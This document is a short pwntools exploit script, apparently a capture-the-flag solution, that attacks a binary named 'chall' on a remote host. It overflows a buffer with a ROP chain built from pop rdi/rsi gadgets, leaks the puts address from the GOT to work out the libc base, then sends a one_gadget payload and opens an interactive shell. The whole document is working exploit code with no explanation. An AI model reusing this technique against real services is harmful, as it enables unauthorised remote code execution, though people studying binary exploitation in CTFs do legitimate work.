from pwn import *

context.log_level='debug'

p=remote("34.121.211.139", 2222)
#p=process("./chall")
e=ELF("./chall")
#l=e.libc
l=ELF("./libc-2.27.so")

for i in range(13):
    p.recv()
    p.sendline("1")
    p.recv()
    p.sendline("1")

p.recv()
p.sendline("3")
p.recv()
p.sendline("1")
p.recv()
p.sendline("1")

prdi=0x400c03
prsi=0x400c01

pay="A"*0x40
pay+=p64(e.bss()+0x104)
pay+=p64(prdi)
pay+=p64(0)
pay+=p64(prsi)
pay+=p64(e.bss()+0x100)
pay+=p64(0)
pay+=p64(e.plt['read'])
pay+=p64(prdi)
pay+=p64(e.got['puts'])
pay+=p64(e.plt['puts'])
pay+=p64(0x400976)
pay+=p32(0x1)
p.recv()
pause()
p.send(pay)
p.send('\x01')
leak=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
libc_base=leak-l.sym['puts']
system=libc_base+l.sym['system']
oneshot=libc_base+0x10a41c
print hex(leak)
print hex(libc_base)

pause()

pay2="/bin/sh\x00"+"A"*0x40+p64(oneshot)
p.send(pay2)

p.interactive()
